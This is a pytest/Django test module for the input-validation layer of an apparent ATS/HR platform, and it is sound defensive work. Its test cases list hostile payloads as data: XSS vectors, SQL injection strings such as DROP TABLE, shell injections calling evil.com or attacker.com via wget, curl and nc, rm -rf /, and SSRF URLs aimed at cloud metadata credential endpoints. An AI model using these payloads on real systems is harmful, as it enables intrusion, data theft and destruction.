"""
Input Validation Security Tests for Zumodra ATS/HR Platform

This module tests input validation security including:
- XSS injection attempts (script tags, event handlers, SVG)
- SQL injection attempts (UNION, OR 1=1, comments)
- Command injection attempts
- Path traversal attempts (../, encoded variants)
- SSRF attempts (internal IPs, localhost, metadata endpoints)

Each test documents the attack vector being tested.
"""

import json
import urllib.parse
from unittest.mock import MagicMock, Mock, patch

import pytest
from django.core.exceptions import ValidationError
from django.http import HttpResponse
from django.test import TestCase, RequestFactory, override_settings

# =============================================================================
# TEST FIXTURES
# =============================================================================

@pytest.fixture
def input_sanitizer():
    """Create InputSanitizer instance."""
    from core.security.validation import InputSanitizer
    return InputSanitizer()


@pytest.fixture
def sql_preventer():
    """Create SQLInjectionPreventer instance."""
    from core.security.owasp import SQLInjectionPreventer
    return SQLInjectionPreventer()


@pytest.fixture
def command_preventer():
    """Create CommandInjectionPreventer instance."""
    from core.security.owasp import CommandInjectionPreventer
    return CommandInjectionPreventer()


@pytest.fixture
def ssrf_protector():
    """Create SSRFProtector instance."""
    from core.security.owasp import SSRFProtector
    return SSRFProtector()


@pytest.fixture
def request_factory():
    """Provide a Django RequestFactory."""
    return RequestFactory()


# =============================================================================
# XSS INJECTION TESTS
# =============================================================================

class TestXSSPrevention:
    """
    Tests for XSS (Cross-Site Scripting) prevention.

    Attack Vector: XSS allows attackers to:
    - Steal session cookies
    - Perform actions as the user
    - Deface content
    - Redirect users to malicious sites
    """

    # -------------------------------------------------------------------------
    # Script Tag Injection
    # -------------------------------------------------------------------------

    def test_blocks_basic_script_tag(self, input_sanitizer):
        """
        Test: Basic <script> tag injection is blocked.
        Attack Vector: <script>alert('XSS')</script>
        """
        malicious_input = "<script>alert('XSS')</script>"

        result = input_sanitizer.sanitize(malicious_input)

        assert '<script>' not in result.lower()
        assert 'alert' not in result.lower()

    def test_blocks_script_tag_with_src(self, input_sanitizer):
        """
        Test: Script tag with external source is blocked.
        Attack Vector: <script src="https://evil.com/steal.js"></script>
        """
        malicious_input = '<script src="https://evil.com/steal.js"></script>'

        result = input_sanitizer.sanitize(malicious_input)

        assert '<script' not in result.lower()
        assert 'evil.com' not in result

    def test_blocks_case_insensitive_script(self, input_sanitizer):
        """
        Test: Case variations of script tag are blocked.
        Attack Vector: <ScRiPt>alert(1)</ScRiPt>
        """
        variations = [
            '<ScRiPt>alert(1)</ScRiPt>',
            '<SCRIPT>alert(1)</SCRIPT>',
            '<scRIPT>alert(1)</scRIPT>',
        ]

        for malicious in variations:
            result = input_sanitizer.sanitize(malicious)
            assert '<script' not in result.lower()

    def test_blocks_null_byte_script_bypass(self, input_sanitizer):
        """
        Test: Null byte injection in script tag is blocked.
        Attack Vector: <scr\x00ipt>alert(1)</script>
        """
        malicious_input = '<scr\x00ipt>alert(1)</script>'

        result = input_sanitizer.sanitize(malicious_input)

        assert 'alert' not in result.lower()

    def test_blocks_encoded_script_tag(self, input_sanitizer):
        """
        Test: URL/HTML encoded script tags are blocked.
        Attack Vector: &lt;script&gt;alert(1)&lt;/script&gt;
        """
        encoded_inputs = [
            '&lt;script&gt;alert(1)&lt;/script&gt;',  # HTML entities
            '%3Cscript%3Ealert(1)%3C/script%3E',  # URL encoded
            '\u003cscript\u003ealert(1)\u003c/script\u003e',  # Unicode
        ]

        for malicious in encoded_inputs:
            result = input_sanitizer.sanitize(malicious, decode_first=True)
            assert '<script' not in result.lower()

    # -------------------------------------------------------------------------
    # Event Handler Injection
    # -------------------------------------------------------------------------

    def test_blocks_onclick_handler(self, input_sanitizer):
        """
        Test: onclick event handler is blocked.
        Attack Vector: <img onclick="alert(1)">
        """
        malicious_input = '<img onclick="alert(1)">'

        result = input_sanitizer.sanitize(malicious_input)

        assert 'onclick' not in result.lower()

    def test_blocks_onerror_handler(self, input_sanitizer):
        """
        Test: onerror event handler is blocked.
        Attack Vector: <img src=x onerror="alert(1)">
        """
        malicious_input = '<img src=x onerror="alert(1)">'

        result = input_sanitizer.sanitize(malicious_input)

        assert 'onerror' not in result.lower()

    def test_blocks_onload_handler(self, input_sanitizer):
        """
        Test: onload event handler is blocked.
        Attack Vector: <body onload="alert(1)">
        """
        malicious_input = '<body onload="alert(1)">'

        result = input_sanitizer.sanitize(malicious_input)

        assert 'onload' not in result.lower()

    def test_blocks_all_event_handlers(self, input_sanitizer):
        """
        Test: All JavaScript event handlers are blocked.
        """
        event_handlers = [
            '<div onmouseover="alert(1)">',
            '<div onmouseout="alert(1)">',
            '<div onfocus="alert(1)">',
            '<div onblur="alert(1)">',
            '<input onchange="alert(1)">',
            '<form onsubmit="alert(1)">',
            '<video onplay="alert(1)">',
            '<details ontoggle="alert(1)">',
        ]

        for malicious in event_handlers:
            result = input_sanitizer.sanitize(malicious)
            assert 'on' not in result.lower() or 'alert' not in result.lower()

    def test_blocks_event_handler_with_quotes_variations(self, input_sanitizer):
        """
        Test: Event handlers with various quote styles are blocked.
        """
        variations = [
            "<img onclick='alert(1)'>",  # Single quotes
            '<img onclick="alert(1)">',  # Double quotes
            '<img onclick=alert(1)>',    # No quotes
            '<img onclick=`alert(1)`>',  # Backticks
        ]

        for malicious in variations:
            result = input_sanitizer.sanitize(malicious)
            assert 'onclick' not in result.lower()

    # -------------------------------------------------------------------------
    # SVG and XML-based XSS
    # -------------------------------------------------------------------------

    def test_blocks_svg_script_tag(self, input_sanitizer):
        """
        Test: SVG with embedded script is blocked.
        Attack Vector: <svg><script>alert(1)</script></svg>
        """
        malicious_input = '<svg><script>alert(1)</script></svg>'

        result = input_sanitizer.sanitize(malicious_input)

        assert '<script' not in result.lower()

    def test_blocks_svg_onload(self, input_sanitizer):
        """
        Test: SVG with onload handler is blocked.
        Attack Vector: <svg onload="alert(1)">
        """
        malicious_input = '<svg onload="alert(1)">'

        result = input_sanitizer.sanitize(malicious_input)

        assert 'onload' not in result.lower()

    def test_blocks_svg_animate_xlink(self, input_sanitizer):
        """
        Test: SVG animate with xlink:href is blocked.
        Attack Vector: <svg><animate xlink:href="#xss" attributeName="href" values="javascript:alert(1)"/></svg>
        """
        malicious_input = '<svg><animate xlink:href="#xss" attributeName="href" values="javascript:alert(1)"/></svg>'

        result = input_sanitizer.sanitize(malicious_input)

        assert 'javascript:' not in result.lower()

    def test_blocks_svg_use_tag(self, input_sanitizer):
        """
        Test: SVG use tag with external reference is blocked.
        Attack Vector: <svg><use href="https://evil.com/xss.svg#payload"/></svg>
        """
        malicious_input = '<svg><use href="https://evil.com/xss.svg#payload"/></svg>'

        result = input_sanitizer.sanitize(malicious_input)

        # Should block external references or entire SVG

    # -------------------------------------------------------------------------
    # JavaScript Protocol
    # -------------------------------------------------------------------------

    def test_blocks_javascript_protocol_in_href(self, input_sanitizer):
        """
        Test: javascript: protocol in links is blocked.
        Attack Vector: <a href="javascript:alert(1)">click</a>
        """
        malicious_input = '<a href="javascript:alert(1)">click</a>'

        result = input_sanitizer.sanitize(malicious_input)

        assert 'javascript:' not in result.lower()

    def test_blocks_data_uri_with_script(self, input_sanitizer):
        """
        Test: data: URI with script is blocked.
        Attack Vector: <a href="data:text/html,<script>alert(1)</script>">
        """
        malicious_input = '<a href="data:text/html,<script>alert(1)</script>">'

        result = input_sanitizer.sanitize(malicious_input)

        assert 'data:text/html' not in result.lower() or '<script' not in result.lower()

    def test_blocks_vbscript_protocol(self, input_sanitizer):
        """
        Test: vbscript: protocol is blocked.
        Attack Vector: <a href="vbscript:alert(1)">
        """
        malicious_input = '<a href="vbscript:alert(1)">'

        result = input_sanitizer.sanitize(malicious_input)

        assert 'vbscript:' not in result.lower()

    # -------------------------------------------------------------------------
    # Expression and Style-based XSS
    # -------------------------------------------------------------------------

    def test_blocks_css_expression(self, input_sanitizer):
        """
        Test: CSS expression() is blocked (IE).
        Attack Vector: <div style="width:expression(alert(1))">
        """
        malicious_input = '<div style="width:expression(alert(1))">'

        result = input_sanitizer.sanitize(malicious_input)

        assert 'expression' not in result.lower()

    def test_blocks_css_url_javascript(self, input_sanitizer):
        """
        Test: CSS url() with javascript is blocked.
        Attack Vector: <div style="background:url(javascript:alert(1))">
        """
        malicious_input = '<div style="background:url(javascript:alert(1))">'

        result = input_sanitizer.sanitize(malicious_input)

        assert 'javascript:' not in result.lower()


# =============================================================================
# SQL INJECTION TESTS
# =============================================================================

class TestSQLInjection:
    """
    Tests for SQL injection prevention.

    Attack Vector: SQL injection allows attackers to:
    - Extract sensitive data
    - Bypass authentication
    - Modify or delete data
    - Execute system commands (in some databases)
    """

    # -------------------------------------------------------------------------
    # Classic SQL Injection
    # -------------------------------------------------------------------------

    def test_blocks_or_1_equals_1(self, sql_preventer):
        """
        Test: Classic OR 1=1 injection is blocked.
        Attack Vector: ' OR 1=1 --
        """
        malicious_inputs = [
            "' OR 1=1 --",
            "' OR '1'='1",
            "' OR 1=1#",
            "' OR '1'='1' --",
            "admin' OR '1'='1",
        ]

        for malicious in malicious_inputs:
            with pytest.raises(ValidationError):
                sql_preventer.validate_input(malicious)

    def test_blocks_union_select(self, sql_preventer):
        """
        Test: UNION SELECT injection is blocked.
        Attack Vector: ' UNION SELECT username, password FROM users --
        """
        malicious_inputs = [
            "' UNION SELECT username, password FROM users --",
            "1 UNION SELECT * FROM users",
            "1 UNION ALL SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3,4,5--",
        ]

        for malicious in malicious_inputs:
            with pytest.raises(ValidationError):
                sql_preventer.validate_input(malicious)

    def test_blocks_comment_injection(self, sql_preventer):
        """
        Test: SQL comment injection is blocked.
        Attack Vector: admin'-- or admin'/*
        """
        malicious_inputs = [
            "admin'--",
            "admin'/*",
            "admin'--+",
            "admin'#",
        ]

        for malicious in malicious_inputs:
            with pytest.raises(ValidationError):
                sql_preventer.validate_input(malicious)

    def test_blocks_stacked_queries(self, sql_preventer):
        """
        Test: Stacked query injection is blocked.
        Attack Vector: '; DROP TABLE users; --
        """
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "'; DELETE FROM users; --",
            "'; INSERT INTO users VALUES('hacked'); --",
            "'; UPDATE users SET role='admin'; --",
        ]

        for malicious in malicious_inputs:
            with pytest.raises(ValidationError):
                sql_preventer.validate_input(malicious)

    # -------------------------------------------------------------------------
    # Blind SQL Injection
    # -------------------------------------------------------------------------

    def test_blocks_time_based_injection(self, sql_preventer):
        """
        Test: Time-based blind SQL injection is blocked.
        Attack Vector: ' OR SLEEP(5) --
        """
        malicious_inputs = [
            "' OR SLEEP(5) --",
            "'; WAITFOR DELAY '0:0:5' --",
            "' OR BENCHMARK(10000000,SHA1('test')) --",
            "' OR pg_sleep(5) --",
        ]

        for malicious in malicious_inputs:
            with pytest.raises(ValidationError):
                sql_preventer.validate_input(malicious)

    def test_blocks_boolean_based_injection(self, sql_preventer):
        """
        Test: Boolean-based blind SQL injection is blocked.
        Attack Vector: ' AND 1=1 -- vs ' AND 1=2 --
        """
        malicious_inputs = [
            "' AND 1=1 --",
            "' AND 1=2 --",
            "' AND SUBSTRING(password,1,1)='a' --",
        ]

        for malicious in malicious_inputs:
            with pytest.raises(ValidationError):
                sql_preventer.validate_input(malicious)

    # -------------------------------------------------------------------------
    # Encoded SQL Injection
    # -------------------------------------------------------------------------

    def test_blocks_url_encoded_injection(self, sql_preventer):
        """
        Test: URL-encoded SQL injection is blocked.
        Attack Vector: %27%20OR%201=1%20--
        """
        malicious_input = urllib.parse.unquote("%27%20OR%201=1%20--")

        with pytest.raises(ValidationError):
            sql_preventer.validate_input(malicious_input)

    def test_blocks_double_encoding(self, sql_preventer):
        """
        Test: Double URL-encoded SQL injection is blocked.
        Attack Vector: %2527%2520OR%25201=1%2520--
        """
        malicious_input = urllib.parse.unquote(urllib.parse.unquote("%2527%2520OR%25201=1%2520--"))

        with pytest.raises(ValidationError):
            sql_preventer.validate_input(malicious_input)

    def test_blocks_unicode_encoding(self, sql_preventer):
        """
        Test: Unicode-encoded SQL injection is blocked.
        """
        malicious_inputs = [
            "\u0027 OR 1=1 --",  # Unicode single quote
            "' \u004F\u0052 1=1 --",  # Unicode OR
        ]

        for malicious in malicious_inputs:
            with pytest.raises(ValidationError):
                sql_preventer.validate_input(malicious)

    # -------------------------------------------------------------------------
    # ORM Protection
    # -------------------------------------------------------------------------

    def test_orm_uses_parameterized_queries(self):
        """
        Test: Django ORM uses parameterized queries.
        """
        from django.db import connection

        # This would cause SQL injection if not parameterized
        search_term = "'; DROP TABLE users; --"

        from jobs.models import JobPosting
        # The ORM should safely escape this
        with patch.object(JobPosting.objects, 'filter') as mock_filter:
            JobPosting.objects.filter(title__icontains=search_term)
            # Verify filter was called with the search term as a parameter
            mock_filter.assert_called()

    def test_extra_and_raw_queries_blocked_by_linting(self):
        """
        Note: This is more of a code review check than a runtime test.
        extra() and raw() should be avoided or carefully reviewed.
        """
        # This test documents the expectation that:
        # - QuerySet.extra() is not used
        # - Model.objects.raw() is carefully audited
        # - RawSQL expressions are avoided
        pass


# =============================================================================
# COMMAND INJECTION TESTS
# =============================================================================

class TestCommandInjection:
    """
    Tests for command injection prevention.

    Attack Vector: Command injection allows attackers to:
    - Execute arbitrary system commands
    - Read/write files
    - Compromise the server
    """

    def test_blocks_semicolon_injection(self, command_preventer):
        """
        Test: Semicolon command chaining is blocked.
        Attack Vector: file.pdf; rm -rf /
        """
        malicious_inputs = [
            "file.pdf; rm -rf /",
            "test; cat /etc/passwd",
            "file.txt; wget http://evil.com/shell.sh | sh",
        ]

        for malicious in malicious_inputs:
            with pytest.raises(ValidationError):
                command_preventer.validate_input(malicious)

    def test_blocks_pipe_injection(self, command_preventer):
        """
        Test: Pipe command injection is blocked.
        Attack Vector: file.pdf | cat /etc/passwd
        """
        malicious_inputs = [
            "file.pdf | cat /etc/passwd",
            "test | nc attacker.com 1234",
        ]

        for malicious in malicious_inputs:
            with pytest.raises(ValidationError):
                command_preventer.validate_input(malicious)

    def test_blocks_ampersand_injection(self, command_preventer):
        """
        Test: Background execution injection is blocked.
        Attack Vector: file.pdf & rm -rf /
        """
        malicious_inputs = [
            "file.pdf & rm -rf /",
            "test && cat /etc/passwd",
            "file || curl evil.com",
        ]

        for malicious in malicious_inputs:
            with pytest.raises(ValidationError):
                command_preventer.validate_input(malicious)

    def test_blocks_backtick_injection(self, command_preventer):
        """
        Test: Backtick command substitution is blocked.
        Attack Vector: `whoami`
        """
        malicious_inputs = [
            "`whoami`",
            "file_`id`.pdf",
            "$(whoami)",
            "file_$(id).pdf",
        ]

        for malicious in malicious_inputs:
            with pytest.raises(ValidationError):
                command_preventer.validate_input(malicious)

    def test_blocks_newline_injection(self, command_preventer):
        """
        Test: Newline command injection is blocked.
        Attack Vector: file.pdf\ncat /etc/passwd
        """
        malicious_inputs = [
            "file.pdf\ncat /etc/passwd",
            "file.pdf\r\nrm -rf /",
        ]

        for malicious in malicious_inputs:
            with pytest.raises(ValidationError):
                command_preventer.validate_input(malicious)


# =============================================================================
# PATH TRAVERSAL TESTS
# =============================================================================

class TestPathTraversal:
    """
    Tests for path traversal prevention.

    Attack Vector: Path traversal allows attackers to:
    - Access files outside intended directories
    - Read sensitive configuration files
    - Overwrite system files
    """

    @pytest.fixture
    def path_validator(self):
        """Create path validation service."""
        from core.security.validation import PathValidator
        return PathValidator(allowed_base='/uploads')

    def test_blocks_basic_traversal(self, path_validator):
        """
        Test: Basic ../ traversal is blocked.
        Attack Vector: ../../../etc/passwd
        """
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "../../../../etc/shadow",
        ]

        for malicious in malicious_paths:
            with pytest.raises(ValidationError):
                path_validator.validate_path(malicious)

    def test_blocks_encoded_traversal(self, path_validator):
        """
        Test: URL-encoded path traversal is blocked.
        Attack Vector: %2e%2e%2f%2e%2e%2f
        """
        encoded_traversals = [
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
            "..%2f..%2f..%2fetc%2fpasswd",  # Partial encoding
            "%2e%2e/%2e%2e/%2e%2e/etc/passwd",  # Mixed
        ]

        for malicious in encoded_traversals:
            decoded = urllib.parse.unquote(malicious)
            with pytest.raises(ValidationError):
                path_validator.validate_path(decoded)

    def test_blocks_double_encoded_traversal(self, path_validator):
        """
        Test: Double-encoded path traversal is blocked.
        Attack Vector: %252e%252e%252f
        """
        malicious = urllib.parse.unquote(urllib.parse.unquote("%252e%252e%252f%252e%252e%252f"))

        with pytest.raises(ValidationError):
            path_validator.validate_path(malicious)

    def test_blocks_null_byte_traversal(self, path_validator):
        """
        Test: Null byte path traversal is blocked.
        Attack Vector: ../../etc/passwd%00.jpg
        """
        malicious_paths = [
            "../../etc/passwd\x00.jpg",
            "..\\..\\windows\\system.ini\x00.pdf",
        ]

        for malicious in malicious_paths:
            with pytest.raises(ValidationError):
                path_validator.validate_path(malicious)

    def test_blocks_unicode_traversal(self, path_validator):
        """
        Test: Unicode path traversal is blocked.
        Attack Vector: ..%c0%af..%c0%af
        """
        unicode_traversals = [
            "\u002e\u002e/\u002e\u002e/",  # Unicode dots and slash
            "..%c0%af..%c0%af",  # Overlong UTF-8
        ]

        for malicious in unicode_traversals:
            with pytest.raises(ValidationError):
                path_validator.validate_path(malicious)

    def test_blocks_windows_traversal(self, path_validator):
        """
        Test: Windows-style path traversal is blocked.
        Attack Vector: ..\\..\\..\\windows\\system32
        """
        windows_traversals = [
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....\\....\\....\\windows\\win.ini",
            "..\\..\\..\\boot.ini",
        ]

        for malicious in windows_traversals:
            with pytest.raises(ValidationError):
                path_validator.validate_path(malicious)

    def test_normalizes_path_before_validation(self, path_validator):
        """
        Test: Paths are normalized before validation.
        Attack Vector: /uploads/../../../etc/passwd
        """
        malicious = "/uploads/../../../etc/passwd"

        with pytest.raises(ValidationError):
            path_validator.validate_path(malicious)


# =============================================================================
# SSRF TESTS
# =============================================================================

class TestSSRF:
    """
    Tests for Server-Side Request Forgery prevention.

    Attack Vector: SSRF allows attackers to:
    - Access internal services
    - Scan internal networks
    - Access cloud metadata endpoints
    - Bypass firewalls
    """

    def test_blocks_localhost(self, ssrf_protector):
        """
        Test: Requests to localhost are blocked.
        Attack Vector: http://localhost/admin
        """
        malicious_urls = [
            "http://localhost/admin",
            "http://127.0.0.1/secret",
            "http://127.0.0.1:8080/admin",
            "http://[::1]/admin",  # IPv6 localhost
        ]

        for url in malicious_urls:
            with pytest.raises(ValidationError):
                ssrf_protector.validate_url(url)

    def test_blocks_internal_ips(self, ssrf_protector):
        """
        Test: Requests to internal IP ranges are blocked.
        Attack Vector: http://10.0.0.1/internal-api
        """
        internal_urls = [
            "http://10.0.0.1/internal-api",
            "http://192.168.1.1/router",
            "http://172.16.0.1/database",
            "http://10.255.255.255/admin",
        ]

        for url in internal_urls:
            with pytest.raises(ValidationError):
                ssrf_protector.validate_url(url)

    def test_blocks_aws_metadata(self, ssrf_protector):
        """
        Test: AWS metadata endpoint is blocked.
        Attack Vector: http://169.254.169.254/latest/meta-data/
        """
        metadata_urls = [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data/",
        ]

        for url in metadata_urls:
            with pytest.raises(ValidationError):
                ssrf_protector.validate_url(url)

    def test_blocks_gcp_metadata(self, ssrf_protector):
        """
        Test: GCP metadata endpoint is blocked.
        Attack Vector: http://metadata.google.internal/
        """
        metadata_urls = [
            "http://metadata.google.internal/",
            "http://metadata.google.internal/computeMetadata/v1/",
        ]

        for url in metadata_urls:
            with pytest.raises(ValidationError):
                ssrf_protector.validate_url(url)

    def test_blocks_azure_metadata(self, ssrf_protector):
        """
        Test: Azure metadata endpoint is blocked.
        Attack Vector: http://169.254.169.254/metadata/instance
        """
        metadata_urls = [
            "http://169.254.169.254/metadata/instance",
            "http://169.254.169.254/metadata/identity/oauth2/token",
        ]

        for url in metadata_urls:
            with pytest.raises(ValidationError):
                ssrf_protector.validate_url(url)

    def test_blocks_dns_rebinding(self, ssrf_protector):
        """
        Test: DNS rebinding attacks are detected.
        Attack Vector: Domain that resolves to internal IP
        """
        with patch('socket.gethostbyname') as mock_dns:
            mock_dns.return_value = '127.0.0.1'

            with pytest.raises(ValidationError):
                ssrf_protector.validate_url("http://evil-rebind.com/steal")

    def test_blocks_redirect_to_internal(self, ssrf_protector):
        """
        Test: Redirects to internal IPs are blocked.
        Attack Vector: External URL that redirects to localhost
        """
        with patch('requests.head') as mock_head:
            mock_response = Mock()
            mock_response.headers = {'Location': 'http://127.0.0.1/admin'}
            mock_response.is_redirect = True
            mock_head.return_value = mock_response

            with pytest.raises(ValidationError):
                ssrf_protector.validate_url("http://evil.com/redirect", follow_redirects=True)

    def test_blocks_file_protocol(self, ssrf_protector):
        """
        Test: file:// protocol is blocked.
        Attack Vector: file:///etc/passwd
        """
        malicious_urls = [
            "file:///etc/passwd",
            "file:///c:/windows/system32/config/sam",
        ]

        for url in malicious_urls:
            with pytest.raises(ValidationError):
                ssrf_protector.validate_url(url)

    def test_blocks_gopher_protocol(self, ssrf_protector):
        """
        Test: gopher:// protocol is blocked.
        Attack Vector: gopher://localhost:6379/_FLUSHALL
        """
        malicious_urls = [
            "gopher://localhost:6379/_FLUSHALL",
            "gopher://localhost:11211/_",
        ]

        for url in malicious_urls:
            with pytest.raises(ValidationError):
                ssrf_protector.validate_url(url)

    def test_blocks_encoded_localhost(self, ssrf_protector):
        """
        Test: Encoded localhost variations are blocked.
        Attack Vector: http://2130706433 (decimal IP for 127.0.0.1)
        """
        encoded_localhost = [
            "http://2130706433/",  # Decimal IP
            "http://0x7f000001/",  # Hex IP
            "http://0177.0.0.1/",  # Octal IP
            "http://127.1/",  # Short form
            "http://0/",  # Zero
        ]

        for url in encoded_localhost:
            with pytest.raises(ValidationError):
                ssrf_protector.validate_url(url)


# =============================================================================
# INTEGRATION TESTS
# =============================================================================

class TestInputValidationIntegration:
    """
    Integration tests for input validation.
    """

    @pytest.mark.django_db
    def test_form_submission_sanitized(self, request_factory, user_factory, db):
        """
        Test: Form submissions are properly sanitized.
        """
        user = user_factory()

        # Simulated form data with malicious input
        request = request_factory.post('/api/jobs/', data={
            'title': '<script>alert(1)</script>Senior Developer',
            'description': "Great job'; DROP TABLE jobs; --",
        })
        request.user = user

        from core.security.validation import FormSanitizer
        sanitizer = FormSanitizer()

        clean_data = sanitizer.sanitize_form_data(request.POST)

        assert '<script>' not in clean_data['title']
        assert 'DROP TABLE' not in clean_data['description']

    @pytest.mark.django_db
    def test_api_request_validated(self, request_factory, user_factory, db):
        """
        Test: API requests are validated for malicious content.
        """
        user = user_factory()

        malicious_data = {
            'name': '../../../etc/passwd',
            'url': 'http://169.254.169.254/latest/meta-data/',
            'bio': '<img onerror="alert(1)" src=x>',
        }

        request = request_factory.post(
            '/api/profile/',
            data=json.dumps(malicious_data),
            content_type='application/json'
        )
        request.user = user

        from core.security.validation import APIRequestValidator
        validator = APIRequestValidator()

        with pytest.raises(ValidationError):
            validator.validate(request)
